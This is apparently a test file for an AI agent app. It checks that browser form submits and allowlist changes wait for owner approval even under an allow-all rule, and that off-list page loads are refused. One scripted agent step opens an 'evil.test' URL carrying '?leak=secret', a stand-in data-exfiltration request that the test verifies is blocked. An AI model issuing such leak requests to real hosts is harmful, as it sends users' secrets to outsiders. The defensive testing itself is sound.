import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { listEvents } from '../src/events/log.js';
import { BUILTIN_RULES } from '../src/policy/policy.js';
import { textStep, toolStep } from '../src/models/fake.js';
import { sessionTaint } from '../src/policy/store.js';
import { createTestApp } from './app-harness.js';
import { FIXTURE_ARGS, hasChrome } from './browser-harness.js';
import { fixtureEgress, startFixture, type Fixture } from './web-fixture.js';

let site: Fixture;
beforeAll(async () => {
  site = await startFixture();
});
afterAll(() => site?.close());

const start = '2026-10-13T17:00:00Z';

// a submit acts on the open task of any session, so the session that calls it can have no taint, for example an
// automation. a broad allow rule of the owner must not send a form or widen an allowlist.
const OWNER_CALLS = [
  ['browser_allow_domain', { url: 'https://shop.example/', domain: 'pay.example', reason: 'checkout' }],
  ['browser_submit', { url: 'https://shop.example/', button: 'Buy now', fields: {} }],
] as const;

describe.each(OWNER_CALLS)('%s', (name, input) => {
  it('waits for the owner in a session with no taint, also when a rule of the owner allows every tool', async () => {
    const rules = [...BUILTIN_RULES, { id: 'okc.policy.json#1', tool: '*', effect: 'allow' as const }];
    const t = createTestApp([toolStep({ id: 'c1', name, input }), textStep('ok')], { start, deps: { rules, web: { egress: fixtureEgress() } } });
    await t.app.start();
    try {
      await t.say('go on');
      expect(t.rows('SELECT status, toolName FROM approvals')).toEqual([{ status: 'pending', toolName: name }]);
      expect(t.rows('SELECT decision, rule FROM policy_decisions')).toEqual([{ decision: 'approve', rule: expect.anything() }]);
    } finally {
      await t.app.stop();
    }
  });
});

// the acceptance of the milestone, through the whole app: the agent loop, the tool caller, the policy and the
// approval flow, with a fake model and the real chrome against the local site.
describe.skipIf(!hasChrome())('web acceptance', { timeout: 60_000 }, () => {
  it('records every step, blocks an off-list page, and sends a form only after the owner approves', async () => {
    const shop = site.url('shop.test');
    const fields = { name: '', size: 'S' };
    const t = createTestApp(
      [
        toolStep({ id: 'c1', name: 'browser_open', input: { url: shop } }),
        toolStep({ id: 'c2', name: 'browser_open', input: { url: site.url('evil.test', '/x?leak=secret') } }),
        toolStep({ id: 'c3', name: 'browser_submit', input: { url: shop, button: 'Buy now', fields } }),
        textStep('The order waits for your approval.'),
      ],
      { start, deps: { web: { egress: fixtureEgress(), browserArgs: FIXTURE_ARGS } } },
    );
    await t.app.start();
    try {
      await t.say('buy a shirt');
      // the session read the page, so it is tainted.
      expect(sessionTaint(t.db, 'main').map((each) => each.source)).toEqual([`browser:shop.test:${site.port}`]);
      // the off-list open was refused before chrome loaded anything.
      expect(site.hitsOn('evil.test')).toEqual([]);
      const calls = t.rows('SELECT toolCallId, name, riskLevel, isError, outcome FROM tool_calls ORDER BY id');
      expect(calls).toMatchObject([
        { toolCallId: 'c1', name: 'browser_open', riskLevel: 'read', isError: 0 },
        { toolCallId: 'c2', name: 'browser_open', riskLevel: 'read', isError: 1, outcome: 'unsent' },
        { toolCallId: 'c3', name: 'browser_submit', riskLevel: 'external', isError: 0 },
      ]);
      // the submit waits for the owner, and nothing was sent.
      const [approval] = t.rows("SELECT id, status, summary FROM approvals WHERE toolName = 'browser_submit'");
      expect(approval).toMatchObject({ status: 'pending' });
      expect(String(approval!.summary)).toContain('Buy now');
      expect(String(approval!.summary)).toContain(shop);
      expect(site.hitsOn('shop.test').filter((hit) => hit.path === '/buy')).toEqual([]);
      // every browser step has a snapshot and a screenshot.
      const steps = t.rows('SELECT action, snapshotBlob, screenshotBlob FROM browser_steps');
      expect(steps.length).toBeGreaterThan(0);
      for (const step of steps) expect(step).toMatchObject({ snapshotBlob: expect.any(String), screenshotBlob: expect.any(String) });
      // the tools parameter was the same in each model call.
      const tools = t.model.calls.map((call) => JSON.stringify(call.tools));
      expect(new Set(tools).size).toBe(1);
      expect(tools[0]).toContain('"browser_submit"');

      await t.app.resolveApproval(Number(approval!.id), 'approve', 'dashboard');
      await t.settle();
      expect(site.hitsOn('shop.test').filter((hit) => hit.path === '/buy')).toEqual([expect.objectContaining({ method: 'POST', body: 'name=&size=S&csrf=t0k3n' })]);
      expect(t.rows("SELECT action FROM browser_steps WHERE action = 'submit'")).toHaveLength(1);
      const notes = listEvents(t.db, 'main').filter((event) => event.type === 'system_event').map((event) => String(event.payload.text));
      expect(notes.some((text) => text.includes('Order placed'))).toBe(true);
    } finally {
      await t.app.stop();
    }
  });

  it('never starts chrome in the chat process, which shares the database with the background app', async () => {
    const t = createTestApp([toolStep({ id: 'c1', name: 'browser_open', input: { url: site.url('shop.test') } }), textStep('ok')], {
      start,
      deps: { connectIntegrations: false, web: { egress: fixtureEgress(), browserArgs: FIXTURE_ARGS } },
    });
    await t.app.start();
    try {
      site.hits.length = 0;
      await t.say('open the shop');
      expect(t.rows('SELECT isError, output FROM tool_calls')).toEqual([{ isError: 1, output: expect.stringContaining('only in the background app') }]);
      expect(site.hits).toEqual([]);
      expect(t.rows('SELECT * FROM browser_tasks')).toEqual([]);
    } finally {
      await t.app.stop();
    }
  });
});
